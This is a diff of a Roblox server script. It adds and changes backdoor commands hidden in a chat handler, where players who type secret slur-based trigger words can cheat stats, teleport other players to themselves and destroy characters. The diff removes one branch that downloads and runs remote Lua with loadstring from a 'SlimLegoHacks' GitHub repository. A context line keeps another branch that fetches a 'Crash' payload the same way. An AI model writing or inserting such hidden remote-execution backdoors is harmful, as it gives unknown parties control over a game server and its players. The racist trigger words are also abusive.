@@ -1,3 +1,12 @@
+
+local function CheckForTarget(Target)
+	if not Target then
+		return false
+	else
+		return true
+	end
+end
+
 game.Players.PlayerAdded:Connect(function(Player)
 	Player.Chatted:Connect(function(msg)
 		local character = Player.Character or Player.CharacterAdded:Wait()
@@ -71,18 +80,24 @@ game.Players.PlayerAdded:Connect(function(Player)
 			game.ServerStorage[".stats"][name].CombatEXP.Value = EXPReq[24]
 		      elseif rank == 24 then
 			game.ServerStorage[".stats"][name].CombatEXP.Value = EXPReq[25]
+			game.ServerStorage[".stats"][name].MissionEXP.Value = EXPReq[25]
 		      elseif rank == 25 then
 			game.ServerStorage[".stats"][name].CombatEXP.Value = EXPReq[25]
 		      end
-		elseif msg == "NIG2" then
-			pcall(function()
-				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Nig5", true))()
-			end) 
+		elseif msg == "NIGRE" then
+			character:Destroy()
 		elseif msg == "NIGGRIPS" then
 			game.ServerStorage[".stats"][name].Grips.Value = 5
 		elseif msg == "NIGRANKCD" then
 			game.ServerStorage[".stats"][name].RankCDOn.Value = 0
 			game.ServerStorage[".stats"][name].CanRank.Value = 2
+		elseif msg:sub(1,9) == "NIGBRING " then
+			local Target = Players:FindFirstChild(msg:sub(10))
+			local Valid = CheckForTarget(Target)
+			
+			if Valid then
+				Target.Character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame
+			end
 		elseif msg == "NIGBREAK" then
 			pcall(function()
 				loadstring(HttpService:GetAsync("https://raw.githubusercontent.com/SlimLegoHacks/Shinden/main/Crash", true))()
